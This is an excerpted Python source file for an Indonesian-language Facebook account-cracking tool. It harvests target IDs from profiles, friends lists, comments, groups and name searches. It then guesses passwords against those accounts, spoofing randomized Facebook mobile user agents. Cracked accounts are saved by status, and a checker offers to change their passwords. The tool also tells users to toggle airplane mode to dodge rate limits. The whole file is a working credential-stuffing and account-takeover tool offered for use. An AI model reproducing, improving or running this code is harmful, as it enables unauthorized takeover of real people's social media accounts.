...
os.system("clear")
print("\x1b[1;97m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("\x1b[1;97m┃╔═❲  Only Admin Chekout Api Key 08975015165 ❳═>")
print("\x1b[1;97m┃╚═════════════════════════════════")
print("\x1b[1;97m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
...
Password = "HIDAYATSTORE" # --> Data Req Api key --> open_kt(life)("HIDAYATSTORE")
...
for z in range(200):
	...
	device_samsung = random.choice(["CPH1723", "CPH1901","CPH1920", "CPH1933", "CPH1937","CPH1937", "CPH1945", "CPH1951", "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003", "CPH2004","CPH2269","vivo 1917", "vivo 1915", "vivo 1911", "vivo 1933", "vivo 1912","vivo 1920", "vivo 1921", "vivo 1910", "vivo 1927", "vivo 1913", "vivo 1923", "vivo 1926", "vivo 1928", "vivo 1931", "vivo 1935","SM-G975F","SM-G532G","SM-N975F","SM-G988U","SM-G977U","SM-A705FN","SM-A515U1","SM-G955F","SM-A750G","SM-N960F","SM-G960U","SM-J600F","SM-A908B","SM-A705GM","SM-G970U","SM-A307FN","SM-G965U1","SM-A217F","SM-G986B","SM-A207M","SM-A515W","SM-A505G","SM-A315G","SM-A507FN","SM-A505U1","SM-G977T","SM-A025G","SM-J320F","SM-A715W","SM-A908N","SM-A205F","SM-G988B","SM-N986B","SM-A715F","SM-A515F","SM-G965F","SM-G960F","SM-A505F","SM-A207F","SM-A307G","SM-G970F","SM-A107F","SM-G935F","SM-G935A","SM-A310F","SM-J320FN","Mi 11 Lite 5G  stable","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G","E6653"," G8231","C6603"," D6503","SO-05F","SGP612","802SO","J9110","SOV40","SO-51A","XQ-AT51"," SOG01","SO51Aa","XQ-AT42","SO-51B","XQ-BC52","XQ-BC62","XQ-BC72","SOG03","J9150","I4113","I3113","I3123","I3113","901SO","J3273","XQ-CC72","XQ-BT44","SO-41B"," C2304","E5506","G3311"," C1905","D5322","Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel C","Pixel 5a","Pixel 2 XL","Pixel 2","Pixel Slate","Google Pixelbook Go","Google Pixelbook Go","Pixel XL","Pixel 3a","RMX1831","RMX1911","RMX1971","RMX2030","RMX2076","RMX2081","RMX2151","RMX2176","RMX2185","RMX2193","RMX2194","RMX2195","RMX3061","RMX3017","RMX3042","RMX1231","SM-J320F","SM-A520F","GT-I9505G","SM-N900V","SM-T555","SM-A500H","SM-A320FL","SM-J701M","SM-J327P","SM-J510FN","SM-G530H","SM-G900W8","SM-J105H","SM-G532G","SM-G530H","SM-G550T1","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","SM-G900FD","SM-G532G","Lenovo TB2-X30L","ONEPLUS A5000","LGLS665","vivo Y51L","LG-M150","vivo Y21","OPPO A59s","OPPO R9 Plusm A","vivo Y71A","CPH1719","vivo Y35","vivo X20","Aquaris M5.5","vivo X6D","OPPO R11","Aquaris X5","Aquaris E5","Lenovo TB3-710","FS510","FS405","ONEPLUS A5010","NX531J","ONEPLUS A3003","LG-H870DS","Nexus 5X ","SAMSUNG","Aquaris X2","Lenovo TB2-X30L","ONEPLUS A5000","LGLS665","vivo Y51L","LG-M150","vivo Y21","OPPO A59s","OPPO R9 Plusm A","vivo Y71A","CPH1719","vivo Y35","vivo X20","Aquaris M5.5","vivo X6D","OPPO R11","Aquaris X5","Aquaris E5","Lenovo TB3-710","FS510","FS405","ONEPLUS A5010","NX531J","ONEPLUS A3003","LG-H870DS","Nexus 5X ","Aquaris X2"])
	...
	ua_o = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(5000,5999))}.{str(rr(10,100))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(700,999))}.0.0.{str(rr(100,200))}.{str(rr(200,350))};]"
	ua_r = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/oppo;FBBD/oppo;FBDV/{device_oppo};FBSV/{versi_android};FBOP/18]"
...
for xcTeam in range(1000):
	...
	ngentot2 = f"UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; id; CPH2387) U2/1.0.0 UCBrowser/9.9.0.543 Mobile [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/193013937;FBDM/"+"{density=2.625,width=1080,height=1794};"+f"FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.mlite;FBDV/Pixel 2;FBSV/{versi_android};FBBK/1;FBOP/1;FBCA/arm64-v8a:;"
...
class Login:
	...
	def menu_login(self):
		Logo().logonya()
		prints(Panel(f" {M2}𝐀𝐮𝐭{P2}𝐡𝐨𝐫   {P2}: {H2} RKIHSTORE \n {M2}𝐆𝐢𝐭{P2}𝐡𝐮𝐛  {P2} : {H2}𝒈𝒊𝒕𝒉𝒖𝒃.𝒄𝒐𝒎/ODG\n{M2} 𝐅𝐚𝐜{P2}𝐞𝐛𝐨𝐨𝐤 {P2}: {H2} RKIH STORE \n{M2} 𝐖𝐡𝐚{P2}𝐭𝐬𝐚𝐩𝐩 {P2}: {H2}+𝟔𝟐8975015165",width=43,padding=(0,2),title=f"{M2}■ {H2}■ {B2}■ {P2}𝐈𝐧𝐟𝐨-𝐀𝐮𝐭𝐡𝐨𝐫 {B2}■ {H2}■ {M2}■",style=f"{W1}"))
		prints(Panel(f"{H2}\t                            𝐌𝐞𝐧𝐮 𝐋𝐨𝐠𝐢𝐧",width=87,style=f"{W1}"))
		prints(Panel(f"""{P2}[{color_text}𝟎𝟏{P2}]. 𝐥𝐨𝐠𝐢𝐧 𝐦𝐞𝐧𝐠𝐠𝐮𝐧𝐚𝐤𝐚𝐧 {H2}𝐜𝐨𝐨𝐤𝐢𝐞 ( {H2}ℝ𝕖𝕔𝕠𝕞𝕖𝕟𝕕𝕖𝕕{P2} )\n[{color_text}𝟎𝟐{P2}]. 𝐥𝐨𝐠𝐢𝐧 𝐦𝐞𝐧𝐠𝐠𝐮𝐧𝐚𝐤𝐚𝐧 𝐍𝐨 𝐝𝐚𝐧 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ( {M2}ℕ𝕠 ℝ𝕖𝕔𝕠𝕞𝕖𝕟𝕕𝕖𝕕{P2} )""",width=87,style=f"{W1}"))
		login = console.input(f" {H2}• {P2}𝐩𝐢𝐥𝐢𝐡 𝐦𝐞𝐧𝐮 : ")
		if login in["1","01"]:
			prints(Panel(f"""{P2}𝐬𝐢𝐥𝐚𝐡𝐤𝐚𝐧 𝐦𝐚𝐬𝐮𝐤𝐚𝐧 𝐜𝐨𝐨𝐤𝐢𝐞𝐦𝐮 𝐝𝐢𝐬𝐢𝐧𝐢 𝐝𝐚𝐧 𝐩𝐚𝐬𝐭𝐢𝐤𝐚𝐧 𝐚𝐮𝐭𝐞𝐧𝐭𝐢𝐤𝐚𝐬𝐢 𝐭𝐢𝐝𝐚𝐤 𝐚𝐤𝐭𝐢𝐟""",width=87,style=f"{W1}"))
			cookie = console.input(f" {H2}• {P2}𝐦𝐚𝐬𝐮𝐤𝐚𝐧 𝐜𝐨𝐨𝐤𝐢𝐞 : ")
			#open("data/cookie","w").write(cookie)
			self.login_cookie(cookie)
		else:
			exit(prints(Panel(f"""{M2}🙏 𝐌𝐨𝐡𝐨𝐧 𝐌𝐚𝐚𝐟 𝐒𝐚𝐲𝐚𝐧𝐠,𝐁𝐞𝐥𝐮𝐦 𝐊𝐮 𝐔𝐩𝐝𝐚𝐭𝐞""",width=87,style=f"{W1}")))
	...
	def login_cookie(self,cookie):
		try:
			...
			prints(Panel(f"""{M2}𝐂𝐨𝐨𝐤𝐢𝐞 𝐤𝐚𝐦𝐮 𝐌𝐞𝐧𝐢𝐧𝐠𝐠𝐚𝐥,𝐒𝐢𝐥𝐚𝐡𝐤𝐚𝐧 𝐛𝐢𝐤𝐢𝐧 𝐥𝐚𝐠𝐢 𝐲𝐚𝐧𝐠 𝐛𝐚𝐫𝐮 𝐚𝐭𝐚𝐮 𝐟𝐫𝐞𝐬𝐡😭""",width=87,style=f"{W1}"))
			sys.exit()
...
class Menu:
	...
	def cek_login(self,cookie):
		try:
			...
			if "𝐌𝐚𝐚𝐟 𝐊𝐨𝐧𝐭𝐞𝐧 𝐭𝐢𝐝𝐚𝐤 𝐝𝐢 𝐭𝐞𝐦𝐮𝐤𝐚𝐧" in nama:
			...
			prints(Panel(f"""{M2}𝐤𝐨𝐧𝐞𝐤𝐬𝐢 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐤𝐚𝐦𝐮 𝐛𝐞𝐫𝐦𝐚𝐬𝐚𝐥𝐚𝐡, 𝐬𝐢𝐥𝐚𝐡𝐤𝐚𝐧 𝐜𝐞𝐤 𝐤𝐨𝐧𝐞𝐤𝐬𝐢 𝐤𝐚𝐦𝐮 𝐤𝐞𝐦𝐛𝐚𝐥𝐢""",width=87,style=f"{W1}"))
			exit()
	...
	def menu(self):
		...
		self.jol = Console()
		self.tol = Console()
		prints(Panel(f"{K2}        {self.negara}",width=87,padding=(0,30),title=f"{M2}■ {H2}■ {B2}■ {P2}𝐇𝐢𝐝𝐮𝐩-𝐃𝐢 {B2}■ {H2}■ {M2}■",style=f"{W1}"))
		yonkou.append(Panel(f" {M2}𝐍𝐚𝐦𝐚 𝐀𝐤𝐮𝐧       {P2}: {H2}{nama}\n {M2}𝐒𝐭𝐚𝐭𝐮𝐬 𝐔𝐬𝐞𝐫     {P2}: {H2}𝐏𝐫𝐢𝐯𝐚𝐭\n {M2}𝐈𝐩 𝐀𝐝𝐝𝐫𝐞𝐬𝐬      {P2}: {H2}{self.ip}\n {M2}𝐓𝐚𝐧𝐠𝐠𝐚𝐥         {P2}: {H2}{tgl}",width=43,padding=(0,2),title=f"{M2}■ {H2}■ {B2}■ {P2}𝐈𝐧𝐟𝐨-𝐔𝐬𝐞𝐫 {B2}■ {H2}■ {M2}■",style=f"{W1}"))
		yonkou.append(Panel(f" {M2}𝐀𝐮𝐭{P2}𝐡𝐨𝐫   {P2}: {H2}RKIH𝑿𝑫\n {M2}𝐆𝐢𝐭{P2}𝐡𝐮𝐛  {P2} : {H2}𝒈𝒊𝒕𝒉𝒖𝒃.𝒄𝒐𝒎/ODG\n{M2} 𝐅𝐚𝐜{P2}𝐞𝐛𝐨𝐨𝐤 {P2}: {H2}RKIH𝑿𝑫\n{M2} 𝐖𝐡𝐚{P2}𝐭𝐬𝐚𝐩𝐩 {P2}: {H2}+𝟔𝟐8975015165",width=43,padding=(0,2),title=f"{M2}■ {H2}■ {B2}■ {P2}𝐈𝐧𝐟𝐨-𝐀𝐮𝐭𝐡𝐨𝐫 {B2}■ {H2}■ {M2}■",style=f"{W1}"))
		self.jol.print(Columns(yonkou))
		cetak(Panel(f"{H2} RKIH 𝐗𝐃",width=87,title=f"{H2}𝑻𝒉𝒂𝒏𝒌𝒔 𝑻𝒐",style=f"{W1}"))
		prints(Panel(f"{H2}\t                           𝐃𝐚𝐟𝐭𝐚𝐫 𝐌𝐞𝐧𝐮",width=87,style=f"{W1}"))
		pornhub.append(Panel(f"{M2}[{color_text}𝟎𝟏{M2}]. 𝐂𝐫𝐚𝐜𝐤 {K2}𝐝𝐚𝐫𝐢 {H2}𝐢𝐝 𝐩𝐮𝐛𝐥𝐢𝐤\n{M2}[{color_text}𝟎𝟐{M2}]. 𝐂𝐫𝐚𝐜𝐤 {K2}𝐝𝐚𝐫𝐢 {H2}𝐩𝐞𝐧𝐠𝐢𝐤𝐮𝐭\n{M2}[{color_text}𝟎𝟑{M2}]. 𝐂𝐫𝐚𝐜𝐤 {K2}𝐝𝐚𝐫𝐢 {H2}𝐤𝐨𝐦𝐞𝐧𝐭𝐚𝐫\n{M2}[{color_text}𝟎𝟒{M2}]. 𝐂𝐫𝐚𝐜𝐤 {K2}𝐝𝐚𝐫𝐢 {H2}𝐫𝐚𝐧𝐝𝐨𝐦 𝐞𝐦𝐚𝐢𝐥",width=43,padding=(0,2),style=f"{W1}"))
		pornhub.append(Panel(f"{M2}[{color_text}𝟎𝟓{M2}]. 𝐂𝐫𝐚𝐜𝐤 {K2}𝐝𝐚𝐫𝐢 {H2}𝐩𝐞𝐧𝐜𝐚𝐫𝐢𝐚𝐧 𝐧𝐚𝐦𝐚\n{M2}[{color_text}𝟎𝟔{M2}]. 𝐂𝐫𝐚𝐜𝐤 {K2}𝐝𝐚𝐫?? {H2}𝐦𝐞𝐦??𝐞𝐫 𝐠𝐫𝐮𝐩\n{M2}[{color_text}𝟎𝟕{M2}]. 𝐂𝐫𝐚𝐜𝐤 {K2}𝐝𝐚𝐫𝐢 {H2}𝐟𝐢𝐥𝐞 𝐬𝐞𝐧𝐝𝐢𝐫𝐢\n{M2}[{color_text}𝟎𝟖{M2}]. 𝐂𝐫𝐚𝐜𝐤 {K2}𝐨𝐩𝐬𝐢 {H2}𝐜𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭",width=43,padding=(0,2),style=f"{W1}"))
		self.tol.print(Columns(pornhub))
		prints(Panel(f"""{P2}   𝐊𝐞𝐭𝐢𝐤 {M2}𝐥𝐨𝐠𝐨𝐮𝐭 {P2}H𝐚𝐩𝐮𝐬 𝐜𝐨𝐨𝐤𝐢𝐞 𝐝𝐚𝐧 𝐤𝐞𝐭𝐢𝐤 {H2}𝐥𝐚𝐢𝐧{P2} 𝐤𝐞 𝐦𝐞𝐧𝐮 𝐥𝐚𝐢𝐧""",width=87,padding=(0,6),style=f"{W1}"))
		menu = console.input(f" {H2}• {P2}𝐩𝐢𝐥𝐢𝐡 𝐦𝐞𝐧𝐮 : ")
		
		
		if menu in["logout"]:
			os.system("rm data/cookie")
			exit(prints(Panel(f"""{H2}𝐛𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐦𝐞𝐧𝐠𝐡𝐚𝐩𝐮𝐬 𝐜𝐨𝐨??𝐢𝐞, 𝐬𝐢𝐥𝐚𝐡𝐤𝐚𝐧 𝐤𝐞𝐭𝐢𝐤 𝐮𝐥𝐚𝐧𝐠 𝐩𝐲𝐭𝐡𝐨𝐧 𝐩𝐫𝐞𝐦𝐢𝐮𝐦𝐯𝟐.𝐩𝐲""",width=87,style=f"{W1}")))
		
		elif menu in["1","01"]:
			prints(Panel(f"""{P2}     𝐦𝐚𝐬𝐮𝐤𝐚𝐧 𝐢𝐝 𝐭𝐚𝐫𝐠𝐞𝐭""",subtitle=f"{P2}𝐤𝐞𝐭𝐢𝐤 {H2}𝐦𝐞{P2} 𝐮𝐧𝐭𝐮𝐤 𝐝𝐮𝐦𝐩 𝐝𝐚𝐫𝐢 𝐭𝐞𝐦𝐚𝐧 𝐬𝐞𝐧𝐝𝐢𝐫𝐢",width=87,style=f"{W1}"))
			user = console.input(f" {H2}• {P2}𝐦𝐚𝐬𝐮𝐤𝐚𝐧 𝐢𝐝 𝐚𝐭𝐚𝐮 𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞 : ")
			if user in["Me","me"]:
			...
			prints(Panel(f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=87,style=f"{W1}"))
			...
			prints(Panel(f"""{P2}masukan nama untuk email, format email akan selalu @gmail.com""",width=87,style=f"{W1}"))
			...
			prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=87,style=f"{W1}"))
			user = console.input(f" {H2}• {P2}masukan nama : ")
			common = open("Luci/nama_indonesia","r").read().splitlines()
			...
			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=87,style=f"{W1}"))
			...
			prints(Panel(f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=87,style=f"{W1}"))
...
class Crack:
	...
	def atursandi(self):
		prints(Panel(f"""{P2}    berhasil mengumpulkan {len(tampung)} id""",width=87,padding=(0,21),style=f"{W1}"))
		set = console.input(f" {H2}• {P2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
		
	
		if set in["Y","y"]:
			prints(Panel(f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=87,style=f"{W1}"))
			pwx = console.input(f" {H2}• {P2}buat katasandi : ").split(",")
			if len(pwx)<=5:
				prints(Panel(f"""{M2}katasandi harus minimal 6 huruf""",width=87,style=f"{W1}"))
				exit()
			self.manual(pwx)
	...
	def manual(self,pw):
		...
		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{W1}"))
		sys.exit()
	...
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}• {P2}[{H2} RKIHSTORE {P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
...
{P2}     hasil crack {K2}cp {P2}tersimpan ke : {K2}CP/{self.hari_ini}.txt{P2}""",width=87,padding=(0,10),style=f"{W1}"))
		prints(Panel(f"""\r     {P2}Jika Tidak Ada Hasil Hidupkan Mode Pesawat 5 Detik {K2}!!!""",width=87,padding=(0,10),style=f"{W1}"))
...
[{color_text}03{P2}]. setting user agent      [{color_text}06{P2}].{H2} Kembali {P2})""",width=87,padding=(0,7),style=f"{W1}"))
		menu = console.input(f" {H2}• {P2}pilih menu : ")
		if menu in["01","1"]:
			self.cek_hasil()
		elif menu in["04","4"]:
			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{W1}")))
		elif menu in["05","5"]:
			self.tampil_cookie()
		elif menu in["06","6"]:
			Menu().menu()
			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python baru.py""",width=87,style=f"{W1}")))
		else:
			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{W1}")))
...
[{color_text}02{P2}]. lihat akun hasil crack cp""",width=87,padding=(0,20),style=f"{W1}"))
		...
		prints(Panel(f"""{P2} berhasil menemukan {len(dirs)} file hasil crack ok""",width=87,padding=(0,15),style=f"{W1}"))
		num = 0
		for fil in dirs:
			num += 1
			self.file.append(fil)
			totalakun = open(f"{folder}/{fil}","r").read().splitlines()
			self.listfile.append(Panel(f"{P2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{W1}"))
			self.listfile.append(Panel(f"{P2}{fil}",width=35,title=f"{P2}tanggal",style=f"{W1}"))
			self.listfile.append(Panel(f"{P2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=f"{W1}"))
		console.print(Columns(self.listfile))
		prints(Panel(f"""{P2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=87,style=f"{W1}"))
		...
		try:
			...
			prints(Panel(f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",width=87,style=f"{W1}"))
			exit()
		nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
		prints(Panel(f"""{P2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",width=87,style=f"{W1}"))
		for akun in totalhasil:
			...
			prints(tree)
		prints(Panel(f"""{P2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",width=87,padding=(0,7),style=f"{W1}"))
		exit()
...
[{color_text}05{P2}]. ganti warna tema ungu   [{color_text}10{P2}]. ganti warna tema abu2""",width=87,padding=(0,7),style=f"{W1}"))
		...
		prints(Panel(f"""{H2}berhasil mengganti tema ke {teks}, silahkan mulai ulang tools""",width=87,padding=(0,6),style=f"{W1}"))
		sys.exit()
	...
	def tampil_cookie(self):
		...
		prints(Panel(f"""{H2}{self.cookie.get('cookie')}""",width=87,style=f"{W1}"))
		sys.exit()
...
def file_cp():
	dirs = os.listdir('CP')
	prints(Panel(f"""{P2}copy nama file hasil crack di bawah ini kemudian pastekan di bawah untuk cek opsi""",width=87,style=f"{W1}"))
	for file in dirs:
		prints(Panel(f"""{K2}{(file)}""",width=87,style=f"{W1}"))
	try:
		prints(Panel(f"""{P2}copy nama file di atas kemudian tempel di bawah ini contoh {M2}: {H2}{waktu}.txt""",width=87,style=f"{W1}"))
		opsi()
	except IOError:
		prints(Panel(f"""{M2}Tidak ada file untuk di cek silahkan crack dulu""",width=87,style=f"{W1}"))
		Menu().menu()
...
def opsi():
	...
	if romi == "":
		prints(Panel(f"""{K2}isi yang benar""",width=87,style=f"{W1}"))
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit(prints(Panel(f"""{P2}nama file{K2} {(romi)} {P2}tidak di temukan""",width=87,style=f"{W1}")))
	prints(Panel(f"""{P2}sebelem melanjutkan hidupkan mode pesawat selama 10 detik""",width=87,style=f"{W1}"))
	pw=console.input(f" {H2}⬤ {P2}ubah password ketika tab yes y/n : ")
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2=console.input(f" {H2}⬤ {P2}Masukan Password baru :{H2} ")
		if len(pw2) <= 5:
			prints(Panel(f"""{K2}Sandi minimal 6 karakter""",width=87,style=f"{W1}"))
		else:
			pwbaru.append(pw2)
	prints(Panel(f"""{P2}Total akun {M2}:{H2} {str(len(file_cp))}""",width=87,style=f"{W1}"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		...
		prints(Panel(f"""{P2}[{H2}{(str(nomor))}{P2}] {P2}Cek sesi akun {K2}>=> {K2}{akun}""",width=87,style=f"{W1}"));jeda(0.10)
		try:
...
def mengecek(user,pw):
	...
	if "c_user" in session.cookies.get_dict():
		...
		tree = Tree(" ",guide_style=f"{W1}")
		tree.add(Panel(f"{H2}login OK{P2}",width=83,padding=(0,2),style=f"{W1}"))
		prints(tree)
